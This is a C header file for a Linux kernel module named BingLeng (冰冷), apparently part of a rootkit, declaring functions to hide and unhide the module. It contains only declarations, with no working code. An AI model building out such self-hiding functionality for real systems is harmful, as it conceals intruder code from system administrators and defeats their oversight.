/*
 * 冰冷 (BingLeng) - 模块自隐藏头文件
 *
 * 功能：提供模块自隐藏功能声明
 *
 * 作者：冰冷开发组
 */

#ifndef BINGLENG_HIDE_H
#define BINGLENG_HIDE_H

#include <linux/types.h>

/* ============================================
 * 函数声明
 * ============================================
 */

/* 隐藏模块 */
int bl_hide_module(void);

/* 取消隐藏模块 */
void bl_unhide_module(void);

#endif /* BINGLENG_HIDE_H */
